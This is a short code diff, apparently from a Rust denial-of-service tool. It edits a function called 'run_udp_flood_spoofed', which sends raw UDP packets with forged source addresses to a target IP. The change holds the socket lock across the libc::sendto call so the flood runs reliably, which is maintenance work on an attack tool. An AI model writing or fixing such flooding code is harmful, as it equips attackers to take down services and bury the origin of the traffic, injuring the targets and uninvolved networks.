@@ -244,19 +244,22 @@ async fn run_udp_flood_spoofed(
                 s_addr: u32::from_be_bytes(target_ip_v4.octets()),
             };
 
-            let result = unsafe {
-                let sock = match socket.lock() {
-                    Ok(guard) => *guard,
-                    Err(poisoned) => *poisoned.into_inner(),
+            let result = {
+                let guard = match socket.lock() {
+                    Ok(g) => g,
+                    Err(poisoned) => poisoned.into_inner(),
                 };
-                libc::sendto(
-                    sock,
-                    packet.as_ptr() as *const libc::c_void,
-                    packet.len(),
-                    0,
-                    &dst as *const _ as *const libc::sockaddr,
-                    std::mem::size_of::<libc::sockaddr_in>() as libc::socklen_t,
-                )
+                unsafe {
+                    libc::sendto(
+                        *guard,
+                        packet.as_ptr() as *const libc::c_void,
+                        packet.len(),
+                        0,
+                        &dst as *const _ as *const libc::sockaddr,
+                        std::mem::size_of::<libc::sockaddr_in>() as libc::socklen_t,
+                    )
+                }
+                // guard dropped here, after sendto completes
             };
 
             if result >= 0 {
